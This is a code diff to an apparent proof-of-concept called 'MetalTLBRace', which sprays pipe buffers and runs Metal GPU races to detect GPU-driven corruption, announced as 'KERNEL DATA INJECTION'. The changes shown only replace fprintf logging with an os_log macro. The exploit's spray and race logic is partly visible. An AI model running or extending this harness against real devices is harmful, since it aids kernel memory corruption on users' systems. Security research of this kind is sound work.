@@ -20,6 +20,11 @@
 #include <unistd.h>
 #include <string.h>
 #include <stdio.h>
+#include <os/log.h>
+#define LOG(fmt, ...) do { \
+    os_log(OS_LOG_DEFAULT, "[TLBR] " fmt, ##__VA_ARGS__); \
+    fprintf(stderr, "[TLBR] " fmt "\n", ##__VA_ARGS__); \
+} while(0)
 
 #define SURFACE_W       256
 #define SURFACE_H       256
@@ -45,7 +50,7 @@ static void spray_pipes(void) {
         if (write(g_pipes[i][1], buf, PIPE_SIZE) > 0)
             g_pipe_count++;
     }
-    fprintf(stderr, "[TLB] Sprayed %d pipe buffers\n", g_pipe_count);
+    LOG("Sprayed %d pipe buffers", g_pipe_count);
 }
 
 /* Check pipe buffers for GPU corruption */
@@ -64,13 +69,14 @@ static int check_pipes(void) {
         }
 
         if (gpu_bytes > 16) {
-            fprintf(stderr, "[TLB] *** PIPE %d CORRUPTED: %d GPU bytes (0x%02X) ***\n",
+            LOG("*** PIPE %d CORRUPTED: %d GPU bytes (0x%02X) ***",
                     i, gpu_bytes, GPU_MARKER);
             /* Dump first 64 bytes for analysis */
-            fprintf(stderr, "[TLB] Data: ");
+            char hexbuf[129]; int hpos = 0;
             for (int j = 0; j < 64 && j < n; j++)
-                fprintf(stderr, "%02X", (unsigned char)buf[j]);
-            fprintf(stderr, "\n");
+                hpos += snprintf(hexbuf+hpos, sizeof(hexbuf)-hpos, "%02X", (unsigned char)buf[j]);
+            hexbuf[hpos] = '\0';
+            LOG("Data: %s", hexbuf);
             corrupted++;
         }
     }
@@ -88,17 +94,17 @@ static void close_pipes(void) {
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
-        fprintf(stderr, "=== MetalTLBRace v1 ===\n");
-        fprintf(stderr, "Races: %d, Pipes: %d, Surface: %dx%d\n",
+        LOG("=== MetalTLBRace v1 ===");
+        LOG("Races: %d, Pipes: %d, Surface: %dx%d",
                 NUM_RACES, NUM_PIPES, SURFACE_W, SURFACE_H);
 
         /* Get Metal device */
         id<MTLDevice> device = MTLCreateSystemDefaultDevice();
         if (!device) {
-            fprintf(stderr, "[TLB] No Metal device\n");
+            LOG("No Metal device");
             return 1;
         }
-        fprintf(stderr, "[TLB] GPU: %s\n", [[device name] UTF8String]);
+        LOG("GPU: %s", [[device name] UTF8String]);
 
         id<MTLCommandQueue> queue = [device newCommandQueue];
 
@@ -114,8 +120,7 @@ int main(int argc, char *argv[]) {
         NSError *err = nil;
         id<MTLLibrary> lib = [device newLibraryWithSource:src options:nil error:&err];
         if (!lib) {
-            fprintf(stderr, "[TLB] Shader compile failed: %s\n",
-                    [[err description] UTF8String]);
+            LOG("Shader compile failed: %s", [[err description] UTF8String]);
             return 1;
         }
 
@@ -123,10 +128,10 @@ int main(int argc, char *argv[]) {
         id<MTLComputePipelineState> pipeline =
             [device newComputePipelineStateWithFunction:func error:&err];
         if (!pipeline) {
-            fprintf(stderr, "[TLB] Pipeline failed\n");
+            LOG("Pipeline failed");
             return 1;
         }
-        fprintf(stderr, "[TLB] Metal pipeline ready\n");
+        LOG("Metal pipeline ready");
 
         int total_corrupted = 0;
 
@@ -185,21 +190,18 @@ int main(int argc, char *argv[]) {
             close_pipes();
 
             if (c > 0) {
-                fprintf(stderr, "[TLB] *** RACE %d: %d pipes corrupted by GPU ***\n",
-                        race, c);
+                LOG("*** RACE %d: %d pipes corrupted by GPU ***", race, c);
                 break;
             }
 
             if (race % 50 == 0) {
-                fprintf(stderr, "[TLB] Race %d/%d complete, corrupted=%d\n",
-                        race, NUM_RACES, total_corrupted);
+                LOG("Race %d/%d complete, corrupted=%d", race, NUM_RACES, total_corrupted);
             }
         }
 
-        fprintf(stderr, "=== RESULT: %d total pipes corrupted by GPU ===\n",
-                total_corrupted);
+        LOG("=== RESULT: %d total pipes corrupted by GPU ===", total_corrupted);
         if (total_corrupted > 0) {
-            fprintf(stderr, "*** GPU TLB RACE SUCCESS — KERNEL DATA INJECTION ***\n");
+            LOG("*** GPU TLB RACE SUCCESS -- KERNEL DATA INJECTION ***");
         }
 
         /* Hold process alive for crash report collection */
